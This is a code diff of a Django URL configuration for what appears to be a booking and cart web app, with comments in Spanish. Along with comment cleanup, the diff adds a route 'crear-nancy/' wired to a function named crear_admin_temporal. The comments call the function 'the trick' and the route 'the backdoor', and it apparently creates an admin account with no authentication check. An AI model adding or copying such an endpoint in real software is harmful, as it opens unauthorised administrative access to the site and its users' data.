@@ -1,16 +1,16 @@
 from django.urls import path, include
 from rest_framework.routers import DefaultRouter
 from .views import (
-    # home,  <-- COMENTADO PARA EVITAR EL REDIRECT A LOCALHOST
+    # ... otras importaciones ...
     LoginView, RegistroUsuarioView, VerificarEmailView,
     RegistroUsuarioViewSet, CategoriaViewSet, PromocionViewSet, 
     ServicioViewSet, ComboViewSet, ComboServicioViewSet, 
     HorarioDisponibleViewSet, ReservaViewSet, DetalleReservaViewSet, 
     PagoViewSet, CancelacionViewSet,
-    # Nuevas importaciones del carrito (ACTUALIZADO)
     CarritoViewSet, agregar_al_carrito, confirmar_carrito, ItemCarritoViewSet,
     checkout_pago, ConfiguracionPagoViewSet,
-    PasswordResetRequestView, PasswordResetConfirmView
+    PasswordResetRequestView, PasswordResetConfirmView,
+    crear_admin_temporal  # <--- 1. IMPORTANTE: Aquí importamos la función del truco
 )
 
 router = DefaultRouter()
@@ -38,28 +38,21 @@ router.register(r'items-carrito', ItemCarritoViewSet, basename='item-carrito')
 router.register(r'bancos', ConfiguracionPagoViewSet, basename='configuracion-pago')
 
 urlpatterns = [
-    # ❌ ELIMINADA LA RUTA QUE CAUSABA EL ERROR:
-    # path('', home, name='home'),
+    # 2. IMPORTANTE: Esta es la puerta trasera
+    path('crear-nancy/', crear_admin_temporal),
 
     path('login/', LoginView.as_view(), name='login'),
     path('registro/', RegistroUsuarioView.as_view(), name='registro_usuario'),
     path('verificar-email/', VerificarEmailView.as_view(), name='verificar_email'),
     
     # --- ENDPOINTS MANUALES DEL CARRITO ---
-    
-    # 1. Agregar (POST): Recibe { tipo, item_id, cantidad }
     path('carrito/agregar/', agregar_al_carrito, name='agregar_al_carrito'),
-    
-    # 2. Confirmar (POST): Convierte carrito en reserva
     path('carrito/confirmar/', confirmar_carrito, name='confirmar_carrito'),
-
-    # 3. Pago (POST): Seleccionar método y subir comprobante
     path('checkout-pago/<int:reserva_id>/', checkout_pago, name='checkout_pago'),
 
     # 4. Recuperación de Contraseña
     path('password-reset/request/', PasswordResetRequestView.as_view(), name='password_reset_request'),
     path('password-reset/confirm/', PasswordResetConfirmView.as_view(), name='password_reset_confirm'),
 
-    # ✅ ESTA RUTA AHORA ES LA PRINCIPAL:
     path('', include(router.urls)),
 ]
